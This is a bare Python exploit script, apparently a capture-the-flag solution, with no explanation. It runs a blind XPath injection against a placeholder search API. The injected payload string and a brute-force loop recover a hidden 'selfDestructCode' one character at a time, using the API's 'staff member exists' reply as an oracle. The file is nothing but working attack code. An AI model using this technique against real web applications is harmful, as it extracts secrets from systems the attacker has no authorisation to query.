import requests



flag = ""
iterator = 1

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-_{}$"
url = "url/api/search"

while(1):
	for char in chars:
		req = "\' or ..//staff[substring(selfDestructCode/text(),1,"+str(iterator)+")=\'"+flag+char+"\'] and \'a\'=\'a"
		print(req)
		r = requests.post(url,json={"search":req},headers={"content-type":"application/json"})
		if (r.json()['message']=="This millitary staff member exists."):
			print(r)
			flag += char
			iterator += 1
		if (char == "}"):
			print(flag)
				





#Then just do this a 2nd time but remove the char 'C' for the first loop.



